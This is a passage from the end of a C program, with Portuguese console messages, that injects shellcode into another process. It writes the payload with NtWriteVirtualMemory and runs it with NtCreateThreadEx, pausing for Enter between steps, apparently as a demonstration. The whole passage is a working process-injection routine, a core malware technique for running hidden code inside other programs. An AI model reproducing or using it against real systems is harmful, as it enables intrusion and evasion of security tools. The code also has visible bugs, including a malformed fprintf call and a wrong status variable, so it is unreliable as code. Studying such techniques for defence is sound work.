	SetConsoleColor(FOREGROUND_GREEN | FOREGROUND_INTENSITY);
	printf("\n[*] Pressione Enter para escrever na memoria no processo alvo");
	(void)getchar();
	SetConsoleColor(FOREGROUND_BLUE | FOREGROUND_INTENSITY);
	printf("[!] Escrevendo Shellcode Com NtWriteVirtualMemory");

	SIZE_T bytesWritten = 0;
	NTSTATUS  statusW = NtWriteVirtualMemory(hProcess, allocBuffer, shellcode, sizeof(shellcode), &bytesWritten);
	if (!NT_SUCCESS(statusW)) {
		SetConsoleColor(FOREGROUND_RED | FOREGROUND_INTENSITY);
		fprintf(stderr, "\nErro: Falha ao escrever na memoria virtual. NTSTATUS: 0x%08X\n", statusW);
		return 1;
	}

	SetConsoleColor(10);
	printf("\n[!] Shellcode escrito com sucesso no endereco: ");
	SetConsoleColor(15);
	printf("%p\n", allocBuffer);

	SetConsoleColor(FOREGROUND_GREEN | FOREGROUND_INTENSITY);
	printf("\n[*] Pressione Enter para criar thread remota");
	(void)getchar();
	SetConsoleColor(FOREGROUND_BLUE | FOREGROUND_INTENSITY);
	printf("[!] Criando Thread Remota Com NtCreateThreadEx");

	HANDLE hThread;
	NTSTATUS statusT = NtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, NULL, hProcess, allocBuffer, NULL, FALSE, 0, 0, 0, NULL);
	if (!NT_SUCCESS(statusT)) {
		SetConsoleColor(FOREGROUND_RED | FOREGROUND_INTENSITY);
		fprintf("\nFalha ao criar thread remoto. NTSTATUS: 0x%08X\n", status);
		CloseHandle(hThread);
		return 1;
	}
	SetConsoleColor(FOREGROUND_BLUE | FOREGROUND_INTENSITY);
	printf("\n[!] Aguardando Thread Completar Com NtWaitForSingleObject");
	SetConsoleTextAttribute(hConsole, 7);
	NtWaitForSingleObject(hThread, FALSE, NULL);
	return 0;
}